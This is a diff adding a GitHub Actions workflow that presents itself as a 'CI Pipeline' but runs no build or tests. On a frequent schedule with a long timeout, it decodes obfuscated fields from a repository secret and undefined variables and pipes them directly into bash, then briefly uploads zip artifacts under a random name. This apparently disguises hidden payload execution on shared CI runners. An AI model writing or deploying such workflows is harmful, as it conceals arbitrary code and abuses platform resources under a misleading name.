@@ -1,0 +1,31 @@
+name: CI Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '8 1,7,13,19 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  main:
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - uses: actions/checkout@v4
+      - name: Process
+        env:
+          edi5: ${{ secrets.edi5 }}
+        run: |
+          printf '%s' "$edi5" | jq -r .tvx7 | /bin/bash
+          printf '%s' "$aps5" | jq -r .x888 | /bin/bash
+          printf '%s' "$qre58" | jq -r .awsd05 | /bin/bash
+          echo $cq47426 | jq -r .sgdos44 | /bin/bash
+
+      - name: Archive output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: dc8fOtU1
+          path: "*.zip"
+          retention-days: 1
